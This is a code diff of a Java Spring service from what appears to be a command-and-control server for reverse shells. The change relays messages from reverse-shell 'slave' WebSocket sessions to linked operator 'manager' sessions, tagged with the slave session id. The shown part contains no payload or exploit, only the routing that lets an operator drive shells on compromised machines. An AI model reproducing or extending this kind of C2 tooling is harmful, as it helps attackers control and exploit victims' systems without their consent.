@@ -1,10 +1,14 @@
 package com.mtattab.c2cServer.service.impl;
 
+import com.mtattab.c2cServer.model.ManagerCommunicationModel;
 import com.mtattab.c2cServer.model.entity.SessionLogEntity;
 import com.mtattab.c2cServer.repository.SessionLogRepository;
 import com.mtattab.c2cServer.service.ActiveSessionsObserver;
 import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
+import com.mtattab.c2cServer.util.ConnectionManager;
+import com.mtattab.c2cServer.util.DataManipulationUtil;
+import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Scope;
@@ -66,12 +70,32 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 
     public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
         String clientMessage = message.getPayload();
+//        ManagerCommunicationModel managerCommunicationModel= DataManipulationUtil.jsonToObject(clientMessage, ManagerCommunicationModel.class);
 
         // Handle the client's message (e.g., send a response back to the client)
         String responseMessage = "Received your message: " + clientMessage;
+//        System.out.println(managerCommunicationModel);
+
+        WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
+        if (mangerSession!=null){
 
 
-        session.sendMessage(new TextMessage(responseMessage));
+            SocketUtil.sendMessage(mangerSession, new TextMessage(
+                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
+                            .msg(responseMessage)
+                            .slaveSessionId(session.getId())
+                            .build()
+                    )));
+        }else {
+            session.sendMessage(new TextMessage(responseMessage));
+
+        }
+
+
+//        if (managerCommunicationModel!= null){
+//            System.out.println(managerCommunicationModel);
+//
+//        }
 
     }
 
